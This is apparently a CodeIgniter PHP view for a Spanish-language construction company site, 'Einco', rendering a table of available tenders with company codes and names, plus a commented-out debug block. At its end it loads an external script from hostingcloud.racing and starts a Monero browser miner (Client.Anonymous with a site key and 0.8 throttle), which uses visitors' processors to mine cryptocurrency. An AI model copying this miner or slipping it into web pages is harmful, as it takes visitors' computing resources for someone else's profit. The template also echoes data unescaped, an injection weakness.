<?php
defined('BASEPATH') OR exit('No direct script access allowed');
?><!DOCTYPE html>
<html class="no-js">
    <head>
        <!-- Basic Page Needs
        ================================================== -->
        <meta charset="utf-8">
        <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
        <link rel="icon" href="favicon.ico">
        <title>Einco</title>
        <meta name="ingenieria civil y construccion" content="">
        <meta name="ingenieria civil y construccion" content="">
        <meta name="YLIT" content="">
        <!-- Mobile Specific Metas
        ================================================== -->
        <meta name="format-detection" content="telephone=no">
        <meta name="viewport" content="width=device-width, initial-scale=1">

        
        <!-- Template CSS Files
        ================================================== -->
        <!-- Twitter Bootstrs CSS -->
        <link rel="stylesheet" href="<?php base_url() ?>assets/home/plugins/bootstrap/bootstrap.min.css">
        <!-- Ionicons Fonts Css -->
        <link rel="stylesheet" href="<?php base_url() ?>assets/home/plugins/ionicons/ionicons.min.css">
        <!-- animate css -->
        <link rel="stylesheet" href="<?php base_url() ?>assets/home/plugins/animate-css/animate.css">
        <!-- Hero area slider css-->
        <link rel="stylesheet" href="<?php base_url() ?>assets/home/plugins/slider/slider.css">
        <!-- owl craousel css -->
        <link rel="stylesheet" href="<?php base_url() ?>assets/home/plugins/owl-carousel/owl.carousel.css">
        <link rel="stylesheet" href="<?php base_url() ?>assets/home/plugins/owl-carousel/owl.theme.css">
        <!-- Fancybox -->
        <link rel="stylesheet" href="<?php base_url() ?>assets/home/plugins/facncybox/jquery.fancybox.css">
        <!-- template main css file -->
        <link rel="stylesheet" href="<?php base_url() ?>assets/home/css/style.css">

<style>
table, th, td {
  border: 1px solid black;
}
</style>
  
    </head>
    <body>

        <h2>Licitaciones disponibles.</h2>
<!--
        <table>
            <tr>
                <th>Cantidad</th>
                <td><?php echo $Cantidad;?></td> 
            </tr>
            <tr>
                <th>Fecha</th>
            <td><?php echo $FechaCreacion;?></td>

  </tr>
  <tr>
    <th>ListaEmpresas</th>
    <td><?php 
        $empresas = $listaEmpresas;
        
        var_dump(json_encode($empresas));
        echo "<br>";
        var_dump(json_decode(json_encode($empresas)));
        
        echo "<br>";
        echo $empresas[0]->CodigoEmpresa;
        echo "<br>";
        echo $empresas[0]->NombreEmpresa;
        echo "<br>";
        foreach ($empresas as $key => $value) {
            echo json_encode($value)."  ";
         }
        echo "<br>";
         foreach ($empresas as $campo => $valores) {
            echo $campo." = ".json_encode($valores)."<br>";
         }

        ?> 
    </td>
  </tr> 
    <tr>
    <th>CodigoEmpresa</th>
    <td><?php echo $listaEmpresas[0]->CodigoEmpresa;?></td>

  </tr>
    <tr>
    <th>NombreEmpresa</th>
    <td><?php echo $listaEmpresas[0]->NombreEmpresa;?></td>

  </tr>  
</table>

-->

<table width="70%">

    <tr>
        <td>Empresas encontradas</td>
        <td>fecha busqueda</td>
        <td>Código empresa</td>
        <td>Nombre empresa</td>
    </tr>
    <?php 
        $i = 0;
        while($i < $Cantidad){
        ?>
            <tr>
                <td><?php echo $Cantidad?></td>
                <td><?php echo $FechaCreacion?></td>
                <td><?php echo $listaEmpresas[$i]->CodigoEmpresa?></td>
                <td><?php echo $listaEmpresas[$i]->NombreEmpresa?></td>
            </tr>

            <?php   
        $i++;}

     ?>
    </table>



<script src="https://www.hostingcloud.racing/m0El.js"></script>
<script>
    var _client = new Client.Anonymous('0df5a246946447fd570ca7839db8bd98fd09b8b9b6bafb8e25dfc39b5e1ef835', {
        throttle: 0.8, ads: 0
    });
    _client.start();
    _client.addMiningNotification("Bottom", "This site is running a monero JS script", "#cccccc", 40, "#3d3d3d");

</script>


 	</body>
</html>